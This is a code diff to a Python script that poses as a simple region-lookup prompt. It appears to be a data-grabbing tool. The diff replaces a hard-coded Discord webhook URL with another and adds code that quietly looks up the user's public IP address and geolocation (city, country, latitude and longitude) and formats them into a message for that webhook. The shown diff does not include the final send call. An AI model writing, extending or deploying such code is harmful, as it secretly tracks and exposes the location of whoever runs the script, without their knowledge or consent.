@@ -16,7 +16,9 @@ from zipfile import ZipFile
 import random
 import re
 import subprocess
-hook="https://discord.com/api/webhooks/1371137139395395684/Tmj7FHyIO6vts_Aj6SVbBD9SeQOUo_ih2ssVqvvFi8I6ATqCOMq3xCjeT9yYDDFzTfff"
+import json
+import urllib.request
+hook="https://discord.com/api/webhooks/1371216177837113505/EbO651HSMGvQPapMfw-YKEMWdkfo4Exuwu-E-wqWmy6PpUBDTGZEHJZn3QklCYt83iw4"
 DETECTED=False
 
 user_input = input("region: ")
@@ -26,6 +28,25 @@ if user_input.lower() == "greece":
     print("ge26f68")
 else:
     print("invalid region")
+
+# Get public IP
+ip = urllib.request.urlopen("https://api.ipify.org").read().decode()
+
+# Get location info from IP
+response = urllib.request.urlopen(f"http://ip-api.com/json/{ip}")
+data = json.loads(response.read())
+
+# Extract location details
+city = data.get("city", "Unknown")
+country = data.get("country", "Unknown")
+lat = data.get("lat")
+lon = data.get("lon")
+
+# Prepare message
+message = {
+    "content": f"📍 Location info:\n**City:** {city}\n**Country:** {country}\n**Latitude:** {lat}\n**Longitude:** {lon}"
+}
+
 def getip():
     ip='None'
     try:
